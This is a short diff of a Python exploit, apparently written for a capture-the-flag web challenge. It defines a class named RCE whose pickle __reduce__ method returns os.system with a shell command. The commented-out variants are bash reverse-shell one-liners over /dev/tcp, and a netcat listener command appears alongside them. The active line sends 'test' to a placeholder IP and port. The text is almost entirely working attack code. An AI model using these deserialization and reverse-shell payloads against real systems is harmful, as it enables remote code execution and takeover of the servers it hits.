@@ -28,10 +28,21 @@ class RCE:
     def __reduce__(self):
         ip="0.0.0.0"
         port="4444"
-        #cmd=("bash -c \"bash &>/dev/tcp/%s/%s <&1\""%(ip,port))
-        cmd=("bash -c \"echo \"test\">/dev/tcp/%s/%s\""%(ip,port))
+        ######################
+        
+        # nc -lvnp 8081
+        # py .\web\fukuwarai\port_listener.py
 
+        #cmd =  "/bin/bash -c \"/bin/bash echo test > /dev/tcp/%s/%s\""%(ip,port)
 
+        #cmd =   "echo \"hello_world\" > /dev/tcp/%s/%s"%(ip,port)
+        #cmd =   "echo \"hello_world\" > /dev/tcp/%s/%s"%(ip,port)
+        #cmd =   "bash -c \"bash &>/dev/tcp/%s/%s<&1\""%(ip,port)
+        #cmd=    "bash &>/dev/tcp/%s/%s <&1"%(ip,port)
+        #cmd=    "bash -c \"bash &>/dev/tcp/%s/%s <&1\""%(ip,port)
+        cmd=    "bash -c \"echo \"test\">/dev/tcp/%s/%s\""%(ip,port)
+
+        #######################
         return os.system, (cmd,)
         
 
